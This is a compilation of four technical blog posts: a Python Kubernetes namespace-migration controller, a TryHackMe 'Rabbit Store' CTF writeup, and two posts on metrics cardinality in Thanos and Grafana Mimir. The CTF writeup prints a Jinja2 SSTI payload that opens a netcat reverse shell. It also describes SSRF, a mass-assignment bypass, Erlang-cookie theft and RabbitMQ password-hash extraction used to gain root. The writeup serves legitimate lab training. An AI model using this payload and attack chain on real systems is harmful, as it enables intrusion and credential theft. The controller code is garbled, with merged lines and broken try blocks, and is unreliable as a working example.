items.title: Automating Kubernetes Namespace Migration Using Custom Resources and Controllers
items.author: Manohar Shetty
items.content:
Migrating resources between Kubernetes namespaces can be a complex task, especially when dealing with multiple deployments, services, secrets, and persistent storage. In this blog, we’ll explore how to automate namespace migration using a Custom Resource Definition (CRD) and a .

What is Namespace Migration?

Namespace migration involves moving all Kubernetes resources — such as Deployments, ConfigMaps, Secrets, and PersistentVolumeClaims — from one namespace to another. This is useful in scenarios like:✅ to different Namespace✅ for better resource management

You can watch the Controller Implementation video here

In this blog, we will try to migrate resources from one namespace to another by creating our own controller, as kubernetes doesn’t give this feature by defaultWe will start by writing the CRD and then we will build it using Docker and later push to Docker hub

Code can found in this repo https://github.com/Manohar-1305/namespace-migration-controllerI have written this code controller in python to migrate all resources from one Namespace to other including the Secrets, Configmaps, Deployment, Statefulsets. It have excluded the local PVC, and Services as the IP conflict might happens, as it will try to bind the same IP, and Kubernetes doesn’t allow it. Cross Namespace service communication can achieved by different approach, you many have to create cm and mount the endpoint in another namespace.

From now let’s focus on the controller.py file

For Creating Kubernetes Cluster via Teraform. First of all, you would require Terraform and AWS CLI in your local machine to run below code, and also I AM user with required Permission or admin permission, you would require ACCESS KEY and SECRET KEY.

User Creation Process in AWS

Create Secret key and Access key

Once secret key and access key is created use it to configure AWS Credentials

You can use below command to configure AWS Credentials

aws configureAWS Access Key ID [None]: AKIAXXXXXXXXXXXXXX
AWS Secret Access Key [None]: XXXXXXXXXXXXXXXX
Default region name [None]: ap-south-1
Default output format [None]: json

Once this is done, you can use this repo to create Single Master and node and NFS Serverhttps://github.com/Manohar-1305/singlenodeIf you have Kubernetes cluster you can skip above things and use that.

You would also require docker in your server, it can be installed using below command

I am using Single Master and Single node Cluster which is created via Terraform and Ansible.This would have a Bastion Server and through this Bastion server would have communication to other servers. I have also created NFS Server as well and configured it using Ansible Playbook. I have written playbook in the repo. You can use it

This is the directory structure

-a----         2/15/2025  controller-deployment.yaml
-a----         2/15/2025  controller-resource.yaml
-a----         2/15/2025  controller.py
-a----         2/15/2025  Dockerfile
-a----         2/15/2025  namespace-migration-crd.yaml
-a----         2/15/2025  rbac-controller.yaml
-a----         2/15/2025  testing-resource.yaml

Let’s write and build the CRDI have written in Python as it is feasible for me, you can use other languages also if required.

controller.py
# Python Controller for Namespace Migration
from kubernetes import client, config, watchfrom kubernetes.client.exceptions import ApiException
# Load Kubeconfig (inside cluster or local)
if "KUBERNETES_SERVICE_HOST" in os.environ:
    config.load_incluster_config()
else:
    config.load_kube_config()
api = client.CustomObjectsApi()
core_api = client.CoreV1Api()
apps_api = client.AppsV1Api()
CRD_GROUP = "migrations.internal"
CRD_VERSION = "v1"
CRD_PLURAL = "namespacemigrations"
def delete_namespace_resources(namespace):
    """Delete all resources in the namespace before deleting it."""
    print(f"🗑️ Cleaning up resources in namespace: {namespace}")
    for deploy in apps_api.list_namespaced_deployment(namespace).items:
        apps_api.delete_namespaced_deployment(deploy.metadata.name, namespace)
        print(f"✅ Deleted Deployment: {deploy.metadata.name}")    for sts in apps_api.list_namespaced_stateful_set(namespace).items:
        apps_api.delete_namespaced_stateful_set(sts.metadata.name, namespace)
        print(f"✅ Deleted StatefulSet: {sts.metadata.name}")    for pod in core_api.list_namespaced_pod(namespace).items:
        core_api.delete_namespaced_pod(pod.metadata.name, namespace)
        print(f"✅ Deleted Pod: {pod.metadata.name}")
    # Delete Persistent Volume Claims (PVCs)
    for pvc in core_api.list_namespaced_persistent_volume_claim(namespace).items:
        core_api.delete_namespaced_persistent_volume_claim(pvc.metadata.name, namespace)
        print(f"✅ Deleted PVC: {pvc.metadata.name}")    for cm in core_api.list_namespaced_config_map(namespace).items:
        core_api.delete_namespaced_config_map(cm.metadata.name, namespace)
        print(f"✅ Deleted ConfigMap: {cm.metadata.name}")    for secret in core_api.list_namespaced_secret(namespace).items:
        core_api.delete_namespaced_secret(secret.metadata.name, namespace)
        print(f"✅ Deleted Secret: {secret.metadata.name}")
    print(f"✅ All resources deleted from namespace {namespace}")
    try:
        core_api.delete_namespace(namespace)
        print(f"✅ Namespace {namespace} deleted successfully.")
    except ApiException as e:
        print(f"❌ Error deleting namespace {namespace}: {e}")
def migrate_namespace(source_ns, target_ns):
    print(f"🚀 Starting migration from {source_ns} to {target_ns}...")
    # Ensure target namespace exists
    try:
        core_api.create_namespace(client.V1Namespace(metadata=client.V1ObjectMeta(name=target_ns)))
        print(f"✅ Created namespace: {target_ns}")
    except ApiException as e:
        if e.status == 409:
            print(f"⚠️ Namespace {target_ns} already exists, skipping creation.")
        else:    for deploy in apps_api.list_namespaced_deployment(source_ns).items:
        deploy.metadata.namespace = target_ns
        deploy.metadata.resource_version = None            apps_api.create_namespaced_deployment(target_ns, deploy)
            print(f"✅ Deployment {deploy.metadata.name} migrated successfully.")
        except ApiException as e:
            print(f"❌ Error migrating Deployment {deploy.metadata.name}: {e}")
    for sts in apps_api.list_namespaced_stateful_set(source_ns).items:
        sts.metadata.namespace = target_ns
        sts.metadata.resource_version = None            apps_api.create_namespaced_stateful_set(target_ns, sts)
            print(f"✅ StatefulSet {sts.metadata.name} migrated successfully.")
        except ApiException as e:
            print(f"❌ Error migrating StatefulSet {sts.metadata.name}: {e}")
    for cm in core_api.list_namespaced_config_map(source_ns).items:
        cm.metadata.namespace = target_ns
        cm.metadata.resource_version = None            core_api.create_namespaced_config_map(target_ns, cm)
            print(f"✅ ConfigMap {cm.metadata.name} migrated successfully.")
        except ApiException as e:
            print(f"❌ Error migrating ConfigMap {cm.metadata.name}: {e}")
    for secret in core_api.list_namespaced_secret(source_ns).items:
        secret.metadata.namespace = target_ns
        secret.metadata.resource_version = None            core_api.create_namespaced_secret(target_ns, secret)
            print(f"✅ Secret {secret.metadata.name} migrated successfully.")
        except ApiException as e:
            print(f"❌ Error migrating Secret {secret.metadata.name}: {e}")
    delete_namespace_resources(source_ns)
    print(f"🎉 Migration completed from {source_ns} to {target_ns}")
    w = watch.Watch()
    print("👀 Watching for namespace migration CRDs...")
    for event in w.stream(api.list_cluster_custom_object, CRD_GROUP, CRD_VERSION, CRD_PLURAL):
        migration = event['object']
        source_ns = migration['spec']['sourceNamespace']
        target_ns = migration['spec']['targetNamespace']
        migrate_namespace(source_ns, target_ns)
if __name__ == "__main__":
    watch_migrations()

Once the .py file is written we have to build itDockerfile for the Controller

FROM python:3.9WORKDIR /app
COPY namespace_migration_controller.py .
RUN pip install kubernetes
CMD ["python", "namespace_migration_controller.py"]

Let’s build the app now, you would need Docker hub credentials to push the app to Docker hub

docker build -t manoharshetty507/namespace-migration-controller:v1 .sudo docker tag manoharshetty507/namespace-migration-controller:v1 manoharshetty507/namespace-migration-controller:v1
docker push manoharshetty507/namespace-migration-controller:v1
docker login

Role-Based Access Control (RBAC) for Security

The controller needs permissions to list, create, and delete resources. We define a and :

rbac-controller.yaml---kind: ServiceAccount  name: namespace-migration-saapiVersion: rbac.authorization.k8s.io/v1metadata:
  name: namespace-migration-role
rules:    resources: ["namespaces", "pods", "services", "configmaps", "secrets", "persistentvolumeclaims"]
    verbs: ["get", "list", "create", "update", "delete"]
  - apiGroups: ["apps"]
    resources: ["deployments", "statefulsets", "daemonsets", "replicasets"]
    verbs: ["get", "list", "create", "update", "delete"]
  - apiGroups: ["migrations.internal"]
    resources: ["namespacemigrations"]
    verbs: ["get", "list", "watch", "update"]
apiVersion: rbac.authorization.k8s.io/v1metadata:
  name: namespace-migration-binding
subjects:    name: namespace-migration-saroleRef:  name: namespace-migration-role
  apiGroup: rbac.authorization.k8s.io

Defining a Custom Resource (CRD) for Migration

Kubernetes allows users to define custom resources using Custom Resource Definitions (CRDs). Let’s define a CRD for namespace migration

namespace-migration-crd.yaml
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition  name: namespacemigrations.migrations.internal  group: migrations.internal    plural: namespacemigrations
    singular: namespacemigration
    kind: NamespaceMigration      - nsmigration  versions:      served: true      schema:          type: object            spec:              properties:                  type: string                  type: string              type: object                state:
  • migrations.k8s.io
  • namespacemigrations
  • sourceNamespace: Namespace to migrate from
  • targetNamespace: Namespace to migrate to
  • status.state: Represents the migration status (e.g., Pending, InProgress, Completed)

After applying this CRD, Kubernetes will recognize NamespaceMigration as a valid resource type.

You can get the CRD using below command

kubectl get crd namespacemigrations.migrations.k8s.io

Deploying the Controller in Kubernetes

To deploy the controller as a , use the following YAML:

controller-deployment.yaml# Deployment for the Namespace Migration Controllerkind: Deployment  name: namespace-migration-controllerspec:  selector:      app: namespace-migration    metadata:        app: namespace-migration      serviceAccountName: namespace-migration-sa        - name: controller
          image: manoharshetty507/namespacemigration-controller:v1
          imagePullPolicy: Always

Testing Kubernetes Namespace Migration

Testing is a crucial step in ensuring a smooth and reliable namespace migration. Here’s how you can test your Custom Resource and controller to validate its functionality.Now, let’s test it by deploying the resources, such as deployment, secrets, statefulsets, configmap, secrets and PVC

testing-resources.yamlkind: Namespace  name: source-nsapiVersion: apps/v1metadata:  namespace: source-ns  replicas: 2    matchLabels:  template:      labels:    spec:      - name: nginx        ports:        envFrom:            name: example-configmap            name: example-secretapiVersion: v1metadata:  namespace: source-ns  APP_ENV: "production"---kind: Secret  name: example-secrettype: Opaque  DB_USER: dXNlcm5hbWU=  # base64 encoded "username"
  DB_PASS: cGFzc3dvcmQ=  # base64 encoded "password"
apiVersion: apps/v1metadata:  namespace: source-ns  serviceName: "stateful-service"  selector:      app: stateful-pod    metadata:        app: stateful-pod      containers:        image: nginx          - containerPort: 80        - name: data-storage
          mountPath: /usr/share/nginx/html  
  volumeClaimTemplates:      name: data-storage      accessModes: ["ReadWriteOnce"]        requests:

We could see that the controller detected the source-ns and migrated the resources from source-ns namespace to namespace target-ns. And deleted the source-ns once migration completed. Let’s deploy the controller resource below

Creating a Namespace Migration Request

Now that our CRD is in place, we can create a migration request:

controller-resource.yamlapiVersion: migrations.internal/v1metadata:spec:
  sourceNamespace: source-ns
  targetNamespace: target-ns

Now, controller will detect the resources in source-ns and will start Migration from source-ns to target-ns.Applying this YAML will instruct our custom controller to migrate resources from source-ns to target-ns.

That’s all our migration testing is completed successfully. You can follow along and create your own Migration using this blog.

Once Testing is completed. and be sure to destroy the resources as it is out of the Free Tier boundary which AWS gives, you can use below command

terraform destroy auto-approve

Thank you for reading, if you liked it please add a comment to this blog.If this blog was useful. Kindly like and add comment

items.title: Rabbit Store (CTF) — TryHackMe Writeup
items.author: z0diac
items.content:
Rabbit Store (CTF) — TryHackMe Writeup

Demonstrate your web application testing skills and the basics of Linux too escalate your privileges.

In this Capture The Flag (CTF) walkthrough, we explore the “Rabbit Store” challenge on TryHackMe. This challenge tests your web application and server-side exploitation skills, focusing on techniques like Server-Side Template Injection (SSTI), Server-Side Request Forgery (SSRF), and RabbitMQ enumeration. By identifying vulnerabilities in the site’s registration, login, and file upload features, we bypass access controls and extract the root user’s password to capture the flag.

Start the machine and collect the “Target IP Address” to begin the scan.

To get an overview of the open ports on the target system, perform an scan using the following command:

sudo nmap -Pn -p<port-range> -vv -T4 -n <ip>

The scan detected three open ports: 22, 80, and 4369. Next, scan the relevant ports.

sudo nmap -A -p[port, port] -vv -T -n <ip>

The port scan shows that port is open, indicating the presence of an Apache HTTP server running on Ubuntu. The server is set to redirect to , but the scan didn’t follow that redirect. On port , the scan detects the Erlang Port Mapper Daemon (EPMD), which is commonly used by Erlang-based applications. The information reveals that there is a node named likely referring to , with communication happening on port . I will do more analysis on port 25672 later.

DNS Mapping and Login Page

Then i navigate to port 80, but I found nothing.

I modified my local /etc/hosts file to map a custom DNS name () to the target's IP address.

Then, I refresh the site and it worked.

I opened the page source and found a reference to ‘,’ which redirects to the Login/Sign Up page.

I decided to add the ‘’ to /etc/hosts.

After that, i head out to the site with a login page.

I discovered an API endpoint, /api/login, which I plan to enumerate later. I also noticed two directories, /dashboard/inactive and /dashboard/active, within the login.js file.

Sign Up and JWT Manipulation (didn’t work xd)

I then proceeded to the Sign Up page and reviewed its source code, but didn’t find anything of particular interest.

Next, I attempted to sign up for the site and intercepted the POST request using Burp Suite.

I found another API, /api/register, which had a content type of application/json. This API required an email and password parameter and returned a successful registration response.

Once I was registered, I logged in with my credentials, which redirected me to /dashboard/inactive. I intercepted the GET request using Burp Suite and noticed that I couldn’t access the content because my subscription was marked as inactive. During this, I also discovered a JWT cookie being set.

I went to jwt.io to decrypt the cookie and confirmed that my subscription was inactive.

To test further, I modified the JWT by changing the subscription status to active and copied the new JWT cookie. I replaced the old cookie with the modified one in Burp Suite, but it didn’t work.

Mass Assignment Vulnerability

After some time troubleshooting, I tried bypassing the issue by exploiting a potential mass assignment vulnerability. I sent a request to /api/register and added a subscription parameter below the password, setting its value to active. This bypass worked, and the registration process was successful.

Finally, I logged in again with my new credentials, and this time I was redirected to /dashboard/active, indicating that the subscription was successfully activated, as there were no longer any prompts to activate my subscription.

I noticed an “upload from localhost” function, so I tested it by uploading a random .txt file. In response, the site returned the file path. I also discovered a new API, /api/uploads. Curious, I navigated to /api/uploads/{file-name} and was able to download a file.

To my surprise, the downloaded file contained the value of itself.

Below the “upload from localhost” function, I noticed an “upload from URL” option, which I suspected could lead to an SSRF (Server-Side Request Forgery) vulnerability. To test this, I set up a simple Python web server on my local machine and entered my server’s IP address in the “upload from URL” field.

It worked, and the site made a GET request to my web server, confirming the SSRF vulnerability.

After some time, I decided to enumerate the list of APIs using Dirsearch and discovered a new endpoint: /api/docs. I intercepted a GET request to /api/docs using Burp Suite, but the response returned an "Access Denied" message, indicating that the endpoint is restricted.

Next, I tried to access the /api/docs endpoint through the "upload from URL" function. I entered the path to /api/docs and intercepted the request using Burp Suite. The response returned the file path via /api/uploads/{file}, triggering an automatic download.

After opening the downloaded file, I found the same “Access Denied” message, indicating the restricted access to the API documentation.

I wasn’t sure what was going on, but after some troubleshooting, it occurred to me that I should try accessing the internal /local endpoint. So, I entered http://127.0.0.1/api/docs in the "upload from URL" function, and the request followed the /api/uploads/{file} path, triggering a file download.

However, when I opened the file, it returned a “Not Found” response, and the request was made on port 80.

Port Scanning using Python Script and Service Discovery

Next, I decided to write a Python script to enumerate the open ports on the internal server. Using this script, I attempted to discover more about the server’s network configuration and identify any potential vulnerabilities. Below is the script I used for this enumeration:

I executed the Python script and discovered that four ports were open: port 80, 3000, 8000, and 15672. This gave me more insight into the server’s available services, which I could explore further.

I then proceeded to test each open port, starting with port 8000. Using curl, I discovered that port 8000 was running the RabbitMQ Management Interface. RabbitMQ is an open-source message broker software that enables communication between applications through message queues. The management interface allows users to monitor and control RabbitMQ servers, including viewing queues, exchanges, and connections. This could potentially be useful for further exploration or exploitation, depending on the configuration of the service.

Next, I tested port 15672 and received a “Method Not Allowed” response. This typically indicates that the HTTP method used for the request isn’t supported by the service running on that port.

SSTI Vulnerability and Remote Command Execution

After a lengthy period of troubleshooting, I decided to try port 3000 with the /api/docs endpoint, using the URL http://127.0.0.1:3000/api/docs. I intercepted the request using Burp Suite and received a response.

The response returned a list of available APIs, and I discovered a new endpoint called /api/fetch_messeges_from_chatbot. This could potentially be an interesting target for further exploration, as it suggests functionality related to fetching messages from a chatbot service.

I attempted to access the /api/fetch_messages_from_chatbot endpoint using a GET request, but received a response indicating that the GET method is not allowed for this API. This suggests that the endpoint may require a different HTTP method, likely POST, for proper interaction.

I then tried accessing the /api/fetch_messages_from_chatbot endpoint using a POST request and set the Content-Type to application/json, as I suspected the web server might expect JSON data. Upon sending the request, I received an error message indicating that the username parameter is required. This suggests that the API expects a username field to be included in the request body.

I added the username field to the request body with my name and sent the POST request. The response I received was: "Sorry, z0diac, our chatbot server is currently under development." It then occurred to me that the server might be vulnerable to Server-Side Template Injection (SSTI). Given the nature of the request and the potential for dynamic templating, I decided to test for this vulnerability further.

To test for the SSTI vulnerability, I tried the classic payload {{7*7}} in the username field. The response returned "49," which confirmed that the server is indeed vulnerable to Server-Side Template Injection (SSTI). This type of vulnerability occurs when user input is directly injected into a server-side template, allowing an attacker to execute arbitrary code on the server. In this case, the server evaluated the template expression and returned the result of 7*7, indicating that the server is processing and executing template code from user input.

Next, I used a polyglot payload from the PayloadsAllTheThings repository to test the SSTI vulnerability. The response returned an error message, but within that error message, I noticed that the web server is running Jinja2, a popular templating engine used with Python web applications.

Jinja2 is known to be vulnerable to SSTI when improperly handling user input, and it uses expressions like {{...}} to evaluate Python code or access variables. The error message indicated that the server is processing the payload as a Jinja2 template, which gave me valuable information on how to craft more advanced payloads targeting the Jinja2 engine.

I then searched online for a payload that could trigger Remote Code Execution (RCE) via SSTI and came across an article titled “RCE with Server-Side Template Injection” on Medium. The article provided insights and example payloads for exploiting SSTI vulnerabilities in Jinja2, specifically targeting the ability to execute arbitrary code on the server.

I refined the payload based on the information I gathered and constructed it to look like this:

{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IPPORT>/tmp/f').read() }}

I then injected this payload into the username field and started a netcat listener to catch any incoming connections. Afterward, I sent the request to the API, hoping to trigger an unexpected behavior or remote code execution.

Privilege Escalation using RabbitMQCTL

From my port scan before, I noticed that port 4369 was open, which is commonly associated with the Erlang Port Mapper Daemon (EPMD). This daemon is used by RabbitMQ, a message broker, to manage connections between nodes. Additionally, I found a node called “rabbit” running on port 25672, which is typical for RabbitMQ’s inter-node communication. This strongly suggests that RabbitMQ is in use, and I likely need an Erlang cookie to interact with it and authenticate across the cluster.

According to the official RabbitMQ documentation, specifically the clustering guide, the Erlang cookie can typically be found in the /var/lib/rabbitmq directory. This cookie is essential for interacting with RabbitMQ nodes in a clustered setup, as it serves as a shared secret between the nodes. I got the cookie.

Based on the port scan, while I identified port 4369 as open, I couldn’t determine the exact Erlang distribution behind it. After some research, I stumbled upon a GitHub repository called erl-matter, which provided a useful tool for this scenario. Specifically, the repository includes a script called erldp-info.nse, which is a Nmap script designed to gather information about Erlang nodes.

The erldp-info.nse script works by querying Erlang Distribution Protocol (EDP) nodes, helping to identify Erlang-based services like RabbitMQ. It can also help extract useful information such as the node's name and available services. Using this script, I was able to map out the Erlang distribution running behind port 4369 and gain deeper insights into the setup, potentially allowing me to proceed with further enumeration or exploitation.

sudo nmap -A -sT --script <script> -p25672 -n <ip> -vv

Nmap scan has detected an open Erlang Distribution Protocol (ERLDP) port on 25672, which is typically used by RabbitMQ for node-to-node communication. The scan provides information about the Erlang version (version 5 in this case), and it identifies the node as rabbit@forge. This means that the Erlang node running RabbitMQ is named "rabbit," and it is hosted on a machine or environment named "forge."

I then returned to the /etc/hosts file and added an entry for the host "forge," so that it resolves to the IP address of the RabbitMQ instance. By doing this, I was able to interact with the Erlang node using the hostname rabbit@forge as part of the RabbitMQ setup, allowing me to connect more easily to the service.

Before proceeding further, we need to install RabbitMQ on our local environment to simulate or interact with the target setup. Once RabbitMQ is installed, we can configure it to connect to the node identified earlier (rabbit@forge) and begin testing or exploiting RabbitMQ features.

From the official RabbitMQ documentation on CLI usage, we learned that RabbitMQ allows us to interact not only with local nodes but also with remote nodes. To connect to a remote node, we need to specify the node’s name, in this case, rabbit@forge, as well as provide the appropriate Erlang cookie for authentication. By accessing this cookie on the target machine (or the one you’re trying to connect to), we can configure our local RabbitMQ instance to interact with the remote node securely. Without this cookie, we would be unable to establish a connection, as RabbitMQ requires this shared key to trust other nodes in the cluster.

sudo rabbitmq-diagnostics status -n rabbit@forge --erlang-cookie <cookie>

This command checks the status of the RabbitMQ node named rabbit@forge, using the provided Erlang cookie to authenticate the connection to the remote node.

Next, I tried to list the users of the RabbitMQ node using a command from the official documentation. This command retrieves and lists all the users that are configured in the RabbitMQ server, including details such as their permissions, tags, and authentication information. Listing users is an essential step for further exploration, as it helps identify any existing accounts or potential vulnerabilities related to user management and access control.

sudo rabbitmqctl list_users -n rabbit@forge --erlang-cookie <cookie>

The command shows that the RabbitMQ instance has a user named root with the administrator tag, indicating that this user has admin privileges. It also provides a warning about the password for the root user. Specifically, it mentions that the password is the SHA-256 hashed value of the RabbitMQ root user's password and advises not to attempt cracking the SHA-256 hash. This suggests that the root user has an encrypted password stored in the system, and the method of access will likely need to involve either obtaining this hash or exploiting a weakness in the system to escalate privileges.

To attempt to retrieve the password for the root user, I referred to the RabbitMQ documentation on user definitions. According to the documentation, RabbitMQ allows for the export and import of user data, which includes user information such as usernames, tags, and password hashes.

In RabbitMQ, user data is typically stored in the “definitions” file. This file can be exported using the rabbitmqctl tool with the export_definitions command. The exported file contains the user information, including any password hashes, which may then be analyzed or attacked further.

By using this method, I could potentially retrieve the root user’s hashed password and attempt to exploit any weaknesses in its encryption.

To export the user data containing the password hashes, I asked ChatGPT for guidance on how to save the definitions to my local file system. Based on the advice, I ran the following command:

This command exports the RabbitMQ definitions, including user data and their associated password hashes, into a JSON file (rabbitmq-definitions.json) and saves it to the /tmp directory. By doing this, I was able to obtain the user-related data.

sudo rabbitmqctl export_definitions /tmp/definitions.json -n rabbit@forge --erlang-cookie <cookie>

After exporting the definitions to the rabbitmq-definitions.json file, I opened the file and found the password hash for the root user. This hash was stored in the JSON file as part of the user data, which included the encrypted password of the root user. The next step would involve analyzing the hash to determine if it can be cracked or exploited in some way.

This is where things get tricky. After researching the RabbitMQ documentation, I found details about how the password hashing algorithm works in RabbitMQ, as described in the official password documentation.

But there’s a twist. From the documentation above, it appears that what we called the hash before in the definitions.json file is not actually a hash, but it is a Base64 encoding of the hash itself!

So, to answer this, the first step is to decode the Base64-encoded string into raw bytes. Once decoded, the first 4 bytes represent the salt, which is a random 32-bit value generated during the password hashing process. The remaining 32 bytes are the actual SHA-256 hash of the password combined with the salt. By separating these two parts, we can isolate the salt and the hashed password. So, we just need the hash of the password and not to crack it using a wordlist. We can use the salt and the hash to verify or reapply the hashing process if needed, but there is to guess the password itself through brute-forcing or dictionary attacks.

Then, I created a script using Python, which you can see below:

Run the script and I got the extracted hash which is the password of the root itself.

Finally, I obtained the flag by logging in as root using the extracted hash from the previous script.

In this writeup, we demonstrated how various exploitation techniques were used to gain unauthorized access to a RabbitMQ instance and escalate privileges on the TryHackMe “Rabbit Store” challenge. Through a combination of reconnaissance, enumeration, web application testing, and Server-Side Template Injection (SSTI), we successfully exploited vulnerabilities in the system, including manipulating JWT tokens and bypassing subscription checks. Additionally, we leveraged the RabbitMQ management interface and password hash extraction techniques to retrieve the root user’s password and access the system.

The critical takeaway from this exercise is understanding the importance of securing web applications and message broker systems against common vulnerabilities like SSTI, Server-Side Request Forgery (SSRF), and improper handling of authentication and password hashing. Proper input validation, secure password storage, and access controls are essential to protect systems from unauthorized access and exploitation.

items.title: How to Handle a Cardinality Explosion in Thanos
items.author: Mike Walz
items.content:
High cardinality labels in Prometheus/Thanos systems can cause serious problems, especially when querying. After dealing with this in a production environment I understand why this problem is coined “cardinality bomb” or “cardinality explosion”. When working on this I found there was barely any discussions or articles concerning how to clean up a cardinality explosion after your TSDB ran wild with massive amounts of unique time series, so I thought I’d write up my experience in case it can help someone else.

A side note about dealing with cardinality while the metrics are being ingested: Many quick fixes to “smother” the explosion, while the scrape target is still exposing the bad metric series, involve dropping the high cardinality label before ingestion by Prometheus’s relabeling function, but all that will do is cause a “metrics collision” as the TSDB will then see thousands of metric series (combinations of unique labels) as identical and can’t aggregate them. There is no Prometheus mechanism to aggregate all these identical labels, so querying them will end up deduplicating all the series to only show a single metric series. *You must either fix the source metric endpoint (scrape target) or stop collecting from it before deleting anything.*

Now that the scrape target is fixed, the Thanos TSDB is full of high cardinality metrics that still cause massive resource consumption when querying. Time to get rid of the metric series entirely.

Identifying Blocks Impacted

To start, you’ll need Thanos tools installed on your machine.

You’ll also need an object storage config YAML file like below. An S3 bucket in my case, with access key and secret key obtained from a temporary IAM user.

#objStoreConfig.yaml type: S3  bucket: thanos-bucket-name
  endpoint: s3.us-east-1.amazonaws.com
  access_key: yourAccessKey
  secret_key: yourSecretKey

Now that you have these ready, run the following to verify the config file and show all the blocks in your object storage bucket.

thanos tools bucket inspect \--objstore.config-file="objStoreConfig.yaml" \

This will output to CSV so you can pipe out to a file, or just copy output into your favorite spreadsheet app for a more organized view of all your stored blocks. If you have more than one source such as multiple cluster’s Prometheus instances sending to the same Thanos bucket, you can add the --selector cluster=\"clusterName\" flag to filter for only those blocks.

In your spreadsheet, sort by time and identify the blocks with time intervals that match the period of your impacted metric.

Now that you have the blocks identified, one more YAML file will need to be made to identify the metric series inside the block. This will be used in the next step when you’re deleting the metric series.

#rewriteConfig.yaml - matchers: '{__name__="metricSeriesName"}'
  #optionally, specify epoch times for the interval your metric was impacted
  #this epoch time must be in milliseconds    - mint: 1733504459000
I didn’t need to do this, but you may also be able to identify metric series by labels. i.e. matchers: '{labelName=~"labelValueRegex"}' . This can be tested in the next step’s dry run.

Now we’ll rewrite the blocks, which should delete only the impacted metric series and leave all other metrics in the block safe and sound. Thanos’ bucket rewrite feature works to download the entire block locally, rewrite the block to your requested configuration, and then upload it back to your object storage. Two important things to make note of before using this:

  1. If using Thanos compactor, you stop the compactor before issuing the rewrite. You don’t want compactor working on a block that you’re rewriting at the same time. In my Kubernetes setup, I achieved this by scaling down the compactor deployment - kubectl scale deployment thanos-compactor --replicas=0 .
  2. You can only rewrite blocks that are not downsampled, AKA “raw data” (these blocks will show in your spreadsheet as “0s” resolution). Once rewritten, compactor will create new downsampled blocks.

By default, bucket rewrite runs as a dry run and shows everything it will do. Start with a dry run to ensure you’re not accidentally deleting the whole block.

Inconveniently, you’ll have to manually run the commands in this step for every block impacted. There’s currently no way to rewrite multiple blocks in one go.

thanos tools bucket rewrite \--rewrite.to-delete-config-file rewriteConfig.yaml \
--objstore.config-file objStoreConfig.yaml \
--id *blockID*

The dry run will output all potential changes. If everything looks good, run the same command with --no-dry-run flag. In your spreadsheet you should keep track of each block that you successfully rewrite, as these will need to be recalled for the final step.

thanos tools bucket rewrite \--rewrite.to-delete-config-file rewriteConfig.yaml \
--objstore.config-file objStoreConfig.yaml \
--id *blockID* \
There is another flag for --delete-blocks that claims to delete the original blocks after rewrite. However I found this did not work as expected, and when compactor started back up it errored with “block overlap” as if the original blocks still existed. In the final step I will show how to manually delete the original blocks.

In my case it took about 1.5 hours to download, rewrite, and upload each block. This can vary widely depending on your setup and block size. If you have multiple Prometheus replicas you should do this for each replica’s block (as shown in your spreadsheet, each replica has its own label), however depending on your risk tolerance, you may be able to get away with rewriting only 1 or 2 replica’s blocks and deleting the rest.

Now that you’ve got your blocks rewritten with clean metrics and all is uploaded to object storage, it is time to delete the original blocks. In addition to the blocks that were rewritten, you also need to delete each one of their correlated downsampled blocks. Run the following for each to mark for deletion.

thanos tools bucket mark --id="blockID" \--marker=deletion-mark.json \
--details="delete overlap" \
--objstore.config-file=objStoreConfig.yaml

With each bad block marked for deletion, the next command will immediately delete them.

thanos tools bucket cleanup \--delete-delay=0 \
--objstore.config-file=config.yaml

Now scale up compactor kubectl scale deployment thanos-compactor --replicas=0 . Once compactor starts up, it will begin the downsampling process for each new block.

And that’s it. After testing a query in Thanos, the impacted metric should no longer be returned.

This article is my first of this kind, inspired from reading many similar articles helping others troubleshoot issues on open source technology. I hope this is able to help, feel free to leave a comment if you think I missed anything.

items.title: Grafana Mimir Cardinality Analysis
items.author: Damian Myerscough
items.content:
A few weeks ago, I was looking into Grafana Cloud’s cardinality dashboard, which is available to Grafana Cloud customers. These dashboards provide valuable insights into the metrics your LGTM stack is consuming, they can help identify which metrics contribute the most to cardinality.

The cardinality dashboards and setup are pretty hidden. If you read through Grafana’s documentation, they insinuate that these dashboards and setup are only for Grafana Enterprise, which is not entirely correct. Yes, these dashboards are open source 🙂, and yes, you can configure your LGTM stack to expose all the necessary metrics to make these dashboards work.

Enabling Cardinality Analysis

The cardinality endpoint within Mimir is controlled by the cardinality_analysis_enabled flag [1]. When this flag is enabled, it exposes an endpoint within the Mimir Query Frontend component.

Assuming you’re deploying the LGTM stack via a Helm chart, we can enable the feature by either modifying the values file or setting the value with the command. The values file should look like the following:

mimir:  mimir:      limits:
        cardinality_analysis_enabled: true
...

The same can be achieved using the following command:

$ helm install mimir ... \--set mimir.mimir.structuredConfig.limits.cardinality_analysis_enabled=false

Once the cardinality_analysis_enabled flag is enabled, we can port-forward to the Mimir Query Frontend component and query the endpoint using the  command.

$ kubectl port-forward service/mimir-query-frontend 8080 &$ curl -s -H "X-Scope-OrgID: anonymous" \
    'http://127.0.0.1:8080/prometheus/api/v1/cardinality/label_names'
{                                                                                                                                            14:31:08 [30/1080]
  "label_values_count_total": 352980,
  "label_names_count": 1287,    {      "label_values_count": 107228    {      "label_values_count": 16906    {      "label_values_count": 15705    {      "label_values_count": 13636    {
      "label_name": "updationtime",
      "label_values_count": 9091    {
      "label_name": "mountpoint",
      "label_values_count": 7619    {
      "label_name": "container_id",
      "label_values_count": 6893    {      "label_values_count": 6882    {      "label_values_count": 5884    {
      "label_name": "internalticketkey",
      "label_values_count": 5587    {
      "label_name": "creationtime",
      "label_values_count": 5579    {      "label_values_count": 5319    {
      "label_name": "internaljirakey",
      "label_values_count": 5319    {
      "label_name": "internaljiralastupdate",
      "label_values_count": 5311    {      "label_values_count": 5177    {      "label_values_count": 5144    {
      "label_name": "node_guid",
      "label_values_count": 4561    {
      "label_name": "port_guid",
      "label_values_count": 4561    {      "label_values_count": 4436    {
      "label_name": "instance",
      "label_values_count": 4099  ]

You can get a full list of endpoints available within the Cardinality Management HTTP API documentation [2].

Cardinality Management Dashboards

The marcusolsson-json-datasource plugin requires you to configure a connection URL. This URL should be the cardinality endpoint exposed via the Mimir Query Frontend. We can set this value to:

When you click , you might get a connection error because the endpoint returns a 404. However, this error can be ignored, and you can proceed with importing the cardinality management dashboards.

